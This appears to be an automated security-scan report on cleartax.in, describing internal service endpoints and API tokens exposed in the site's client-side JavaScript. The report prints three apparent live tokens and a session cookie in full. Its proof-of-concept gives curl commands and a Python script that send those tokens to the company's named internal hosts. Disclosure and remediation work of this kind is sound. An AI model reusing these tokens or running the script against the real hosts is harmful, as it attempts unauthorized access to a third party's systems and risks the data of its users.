# Internal Service Exposure and API Token Disclosure in Client-Side JavaScript

**ID:** vuln-0001
**Severity:** HIGH
**Found:** 2026-03-18 13:23:08 UTC
**Target:** https://cleartax.in
**Endpoint:** https://cleartax.in
**Method:** GET
**CWE:** CWE-200
**CVSS:** 8.2

## Description

Multiple internal services and API authentication tokens were found exposed in client-side JavaScript code on cleartax.in. The internal service endpoints are accessible from the public internet, and authentication tokens intended for service-to-service communication are embedded in client-side code, potentially enabling unauthorized access to internal systems.

**Key Findings:**
1. **Internal Service Endpoints Exposed**: Multiple `.internal.cleartax.co` endpoints are accessible from the public internet, bypassing intended network segmentation
2. **API Tokens in Client-Side Code**: Three distinct authentication tokens are embedded in JavaScript accessible to end users
3. **Service Discovery**: The internal CMS service (finfo-prodpub-http.internal.cleartax.co) responds with 200 OK and sets cookies

**Impact**: These exposures could allow attackers to:
- Access internal services not intended for public consumption
- Potentially authenticate to backend APIs using exposed tokens
- Discover internal network architecture and service dependencies

## Impact

The exposure of internal service endpoints and authentication tokens in client-side code represents a significant security risk:

1. **Internal Network Access**: Attackers can directly access internal services that should be behind firewall protections
2. **Token Compromise**: Exposed API tokens could be used to authenticate to backend services, potentially enabling unauthorized data access or system manipulation
3. **Information Disclosure**: The internal service responses reveal system architecture, technology stack, and potentially sensitive configuration details
4. **Attack Surface Expansion**: Each exposed internal service represents additional attack surface that could be exploited

The finfo-prodpub-http.internal.cleartax.co endpoint responded with a valid HTML response and set cookies, indicating it's a fully functional service accessible from the public internet.

## Technical Analysis

The vulnerability was discovered through analysis of the client-side JavaScript bundle served from cleartax.in. The application exposes:

1. **Internal Service Endpoints** in configuration objects:
   - `CMS_ENDPOINT: "https://finfo-prodpub-http.internal.cleartax.co"`
   - `SWITCHR_ENDPOINT: "https://switchr-prod-http.internal.cleartax.co"`
   - `DOCUMENT_UPLOAD_ENDPOINT: "https://b2c-chatbot-prod-http.internal.cleartax.co"`

2. **Authentication Tokens** hardcoded in JavaScript:
   - `USERSERVICE_HEADER_TOKEN: "f7c70c7e-3061-499e-8e94-e618e517b52c"`
   - `SWITCHR_TOKEN: "5835e2b8-7645-4d75-8145-8887ca79d8cd"`
   - `API_AUTH_TOKEN: "8cc0234c7ca8f2d24b73020ede5d451036091e5f901ad1edab5836effd81b96f"`

Testing confirmed that `https://finfo-prodpub-http.internal.cleartax.co` is accessible from the public internet and returns a 200 OK response with:
- Full HTML content
- Session cookies (`aI=fe931a87-409f-4f67-9a2f-c302f88b097f`)
- Comprehensive security headers
- Server: nginx
- X-App-Cache: cache hit

The other internal endpoints timed out, suggesting they may be firewalled or require specific network conditions, but their exposure in client code remains a security concern.

## Proof of Concept

To reproduce:

1. Visit https://cleartax.in and view page source
2. Search for the __NEXT_DATA__ script tag containing runtime configuration
3. Extract the internal endpoint URLs and authentication tokens
4. Test accessibility of internal endpoints:

```bash
curl -v "https://finfo-prodpub-http.internal.cleartax.co"
```

5. The endpoint responds with 200 OK, HTML content, and sets authentication cookies

6. Test token validity by attempting API calls with the exposed tokens:

```bash
curl -H "Authorization: Bearer 8cc0234c7ca8f2d24b73020ede5d451036091e5f901ad1edab5836effd81b96f" \
     -H "X-UserService-Token: f7c70c7e-3061-499e-8e94-e618e517b52c" \
     "https://finfo-prodpub-http.internal.cleartax.co"
```

```
import requests

# Exposed internal endpoints and tokens from cleartax.in client-side JavaScript
INTERNAL_ENDPOINTS = [
    "https://finfo-prodpub-http.internal.cleartax.co",
    "https://switchr-prod-http.internal.cleartax.co",
    "https://b2c-chatbot-prod-http.internal.cleartax.co"
]

TOKENS = {
    "API_AUTH_TOKEN": "8cc0234c7ca8f2d24b73020ede5d451036091e5f901ad1edab5836effd81b96f",
    "USERSERVICE_HEADER_TOKEN": "f7c70c7e-3061-499e-8e94-e618e517b52c",
    "SWITCHR_TOKEN": "5835e2b8-7645-4d75-8145-8887ca79d8cd"
}

def test_internal_endpoints():
    print("Testing internal endpoint accessibility...")
    print("=" * 60)
    
    for endpoint in INTERNAL_ENDPOINTS:
        try:
            print(f"\nTesting: {endpoint}")
            response = requests.get(endpoint, timeout=10)
            
            print(f"Status: {response.status_code}")
            print(f"Server: {response.headers.get('Server', 'N/A')}")
            print(f"Content-Type: {response.headers.get('Content-Type', 'N/A')}")
            
            if response.status_code == 200:
                print(f"Response preview: {response.text[:200]}")
                if 'Set-Cookie' in response.headers:
                    print(f"Cookies set: {response.headers['Set-Cookie']}")
            
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

def test_tokens():
    print("\n\nTesting token validity on internal endpoints...")
    print("=" * 60)
    
    headers = {
        "Authorization": f"Bearer {TOKENS['API_AUTH_TOKEN']}",
        "X-UserService-Token": TOKENS['USERSERVICE_HEADER_TOKEN'],
        "X-Switchr-Token": TOKENS['SWITCHR_TOKEN']
    }
    
    for endpoint in INTERNAL_ENDPOINTS:
        try:
            print(f"\nTesting tokens on: {endpoint}")
            response = requests.get(endpoint, headers=headers, timeout=10)
            print(f"Status with tokens: {response.status_code}")
            print(f"Response difference: {len(response.text)} chars")
            
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

if __name__ == "__main__":
    test_internal_endpoints()
    test_tokens()
```

## Code Analysis

**Location 1:** `Client-side JavaScript bundle` (line 1)
  Runtime configuration exposing internal endpoints and tokens

  **Suggested Fix:**
```diff
- Exposed internal endpoints and tokens in __NEXT_DATA__ configuration
+ Server-side configuration with environment variables, no internal endpoints or tokens in client code
```

## Remediation

1. **Remove Internal Endpoints from Client-Side Code**:
   - Move all internal service URLs and configuration to server-side environment variables
   - Use build-time environment substitution for client-side configuration
   - Implement proper configuration management separating public and internal endpoints

2. **Secure Internal Services**:
   - Place internal services behind proper network segmentation and firewalls
   - Implement VPN or zero-trust access for internal services
   - Remove public DNS records for internal services or restrict access to specific IP ranges

3. **Token Management**:
   - Remove all authentication tokens from client-side code
   - Implement proper token rotation and management
   - Use short-lived tokens with minimal privileges
   - Implement token validation ensuring tokens are only accepted from authorized services

4. **Content Security**:
   - Review and update Content Security Policy to prevent unintended data exposure
   - Implement subresource integrity for all external scripts
   - Regular security reviews of client-side code for sensitive information exposure

5. **Monitoring and Detection**:
   - Implement logging and alerting for access attempts to internal services from external IPs
   - Monitor for unusual token usage patterns
   - Regular security scanning for exposed credentials and internal endpoints
